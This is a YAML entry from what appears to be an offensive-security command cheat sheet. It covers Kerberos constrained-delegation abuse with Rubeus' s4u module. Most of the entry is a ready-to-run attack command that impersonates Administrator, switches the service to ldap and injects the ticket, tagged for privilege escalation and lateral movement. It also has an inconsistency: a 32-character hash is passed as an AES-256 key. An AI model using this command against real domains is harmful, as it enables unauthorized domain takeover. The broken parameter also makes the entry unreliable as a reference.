
---
description: |
  Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service specified since SPNs are stored in plaintext and thus access any service on the target system as any user

  Command Reference:

  	Domain: test.local

    SPN: time/dc.test.local

    alternative service: ldap(can chose any valid services such as HTTP for remoting access)

  	Username: john$

  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

command: |
  Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local /altservice:ldap /ptt
items:
  - Hash
  - Username
  - target
  - service
services:
  - Kerberos
OS:
  - Windows
attack_types:
  - Exploitation
  - Lateral Movement
  - Privilidge Escalation
references:
  - https://github.com/GhostPack/Rubeus
  - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
---